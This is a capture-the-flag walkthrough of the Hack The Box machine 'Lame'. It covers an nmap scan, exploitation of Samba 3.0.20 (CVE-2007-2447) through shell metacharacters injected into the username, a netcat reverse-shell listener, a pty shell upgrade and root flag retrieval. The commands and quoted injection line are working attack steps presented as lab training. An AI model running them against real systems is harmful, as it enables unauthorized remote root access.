---
description: Easy box Lame featuring an exploit in Samba
---

# HTB Lame

First thing to do is start scanning for open ports.

```bash
➜  ~ sudo nmap -sV -sC -T4 -p- 10.10.10.3
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 18:10 CEST
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 18:12 (0:00:00 remaining)
Nmap scan report for 10.10.10.3
Host is up (0.013s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m20s, deviation: 2h49m45s, median: 17s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-04-07T12:12:38-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.21 seconds
```

We have several open ports

<table><thead><tr><th width="191">Port</th><th>Description</th></tr></thead><tbody><tr><td>21</td><td>FTP has anonymous access enabled. Its vsftpd 2.3.4 which has serveral vulnerablities like RCE. In this box it could not be exploited.</td></tr><tr><td>22</td><td>SSH, in cases bruteforcing credentials is possible. Certain versions have vulnerablities.</td></tr><tr><td>139</td><td>Samba uses it for older clients</td></tr><tr><td>445</td><td>Samba or SMB running Samba 3.0.20 which is vulnerable to Remote Code Execution.</td></tr></tbody></table>

### <mark style="color:yellow;">CVE-2007-2447</mark>

Samba 3.0.20 also known as the usermap script vulnerablitiy. We can embed a payload in a malicious username with shell metacharachters. When authenticating the server will execute the command in the username. Below a working python script that works.

{% embed url="https://github.com/n3rdh4x0r/CVE-2007-2447" %}

Run the python script

```bash
 python3 samba.py -lh 10.10.14.18 -lp 443 -t 10.10.10.3
```

Listen with netcat:

```bash
nc -lvnp 443
```

{% hint style="info" %}
The script works by using msfvenom to create the payload. The vulnerability lies in the username where we see on line 49:\\

It saves the msfvenom payload in the buf variable\
`buf = generate_payload(args.lh, int(args.lp)).decode()`

\
In the userID variable where we call the buf variable and thus the msfvenom payload will be executed. Using nohup will keep processes/jobs running.

``userID = "/=` nohup " + buf + ""``
{% endhint %}

### <mark style="color:yellow;">Reverse shell</mark>

After running the script we will get connection on our netcat listener on port 443. Often when getting a shell we find we have a very limited shell and things `ctrl + l` dont work. We can upgrade our shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then type `ctrl + z`.

```bash
stty raw -echo; fg
exptort TERM=xterm
```

With a more functional shell we can get the flags. By checking our right we find we are root user and so we can get user and root flag.

```bash
root@lame: find / -name user.txt 2>/dev/null
/home/makis/user.txt

root@lame: cat /home/makis/user.txt
<redacted>

root@lame: cat /root/root.txt
<redacted>
```
